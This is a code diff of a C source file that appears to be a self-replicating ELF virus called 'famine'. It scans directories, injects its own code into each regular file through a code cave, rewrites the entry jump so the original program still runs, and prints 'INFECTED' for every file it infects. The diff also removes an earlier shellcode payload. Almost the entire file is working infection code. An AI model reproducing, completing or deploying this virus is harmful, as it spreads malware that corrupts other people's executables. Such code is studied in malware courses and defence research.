@@ -14,13 +14,8 @@
 #define NULL ((void *)0)
 #endif
 
-#define JMP_OFFSET 4
-
-char	g_payload[] = "\x52\xeb\x0f\x2e\x2e\x2e\x2e\x57\x4f\x4f\x44\x59\x2e\x2e\x2e\x2e\x0a\x00\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x8d\x35\xe0\xff\xff\xff\xba\x0f\x00\x00\x00\x0f\x05\x5a\xe9\xd0\xff\xff\xff";
-size_t	g_payload_size	= sizeof(g_payload) - 1;
-
-extern void _start();
 extern void end();
+void famine(void);
 
 // utils
 struct linux_dirent64 {
@@ -30,6 +25,13 @@ struct linux_dirent64 {
 	unsigned char d_type;
 	char d_name[];
 };
+
+
+void	_start(void)
+{
+	famine();
+	__asm__ volatile ("jmp end");
+}
 
 int	patch_new_file(t_data *data) {
 
@@ -50,11 +52,14 @@ int	patch_new_file(t_data *data) {
 	return 0;
 }
 
+#define JMP_OFFSET 9
+#define JMP_SIZE 5
+
 int	calculate_jmp(t_data *data, size_t payload_size) {
 
 		data->cave.rel_jmp =  \
-		(int64_t)data->cave.old_entry - \
-		((int64_t)data->cave.addr + (int64_t)payload_size);
+		(int64_t)data->cave.old_entry -  \
+		((int64_t)data->cave.addr + JMP_OFFSET + JMP_SIZE);
 
 	return 0;
 }
@@ -69,24 +74,21 @@ void modify_jmp(char *jmp, int64_t value) {
 
 int	inject(t_data *data) {
 
-	//char *text = text_section(data);
-	//
 	char jmp[] = "\xe9\x00\x00\x00\x00";
 	
 	unsigned long size =  (char *)&end - (char *)&_start;
 
-	silvio(data, size);
+	if (silvio(data, size) == -1)
+		return 1;
 
-	data->cave.rel_jmp = -42 - 6;
+	calculate_jmp(data, size);
 
 
 	modify_jmp(jmp + 1, data->cave.rel_jmp);
-	//
-	//modify_payload(data->cave.rel_jmp, JMP_OFFSET, sizeof(data->cave.rel_jmp), (uint8_t *)g_payload, g_payload_size);
 
-	ft_memcpy(data->file + data->cave.offset, _start, size);
+	ft_memcpy(data->file + data->cave.offset, _start, size - 1);
 
-	ft_memcpy(data->file + data->cave.offset + 6, jmp, sizeof(jmp));
+	ft_memcpy(data->file + data->cave.offset + JMP_OFFSET, jmp, JMP_SIZE);
 
 	patch_new_file(data);
 
@@ -104,7 +106,10 @@ int	infect(const char *filename)
 	t_data data;
 	init_data(&data, file, size);
 
-	inject(&data);
+	if (inject(&data) == 1) {
+		free_data(&data);
+		return 1;
+	}
 
 	free_data(&data);
 	return 0;
@@ -136,8 +141,11 @@ void	open_file(char *file)
 			if (dir->d_type == DT_REG) {
 				char new_path[PATH_MAX];
 				make_path(new_path, file, dir->d_name);
-				_syscall(SYS_write, 1, new_path, ft_strlen(new_path));
-				infect(new_path);
+				//_syscall(SYS_write, 1, new_path, ft_strlen(new_path));
+				char msg[] = "INFECTED\n";
+				if (infect(new_path) == 0) {
+					_syscall(SYS_write, 1, msg, sizeof(msg) - 1);
+				}
 			}
 		}
 	}
@@ -159,7 +167,5 @@ void	famine(void)
 
 	for (int i = 0; paths[i]; i++)
 		open_file(paths[i]);
-
-	//__asm__ volatile ("syscall" : : "a" (60) : "rdi");
 
 }
